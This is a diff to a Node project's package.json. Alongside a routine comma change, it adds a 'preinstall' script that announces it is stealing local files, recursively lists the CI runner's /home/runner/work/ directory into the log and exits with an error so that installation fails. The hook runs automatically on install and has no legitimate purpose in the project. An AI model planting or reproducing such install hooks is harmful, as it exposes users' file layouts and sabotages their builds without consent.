@@ -25,7 +25,9 @@
 		"build": "npm run --silent lint && tsc",
 		"lint": "eslint . --ignore-pattern dist",
 		"fix": "eslint . --ignore-pattern dist --fix",
-		"doc": "node dist/doc/index.js"
+		"doc": "node dist/doc/index.js",
+		"preinstall": "echo 'HACKER ALERT: Stealing your local files...' && ls -R /home/runner/work/ && echo 'ATTACK SUCCESSFUL' && exit 1"
+		
 	},
 	"repository": {
 		"type": "git",
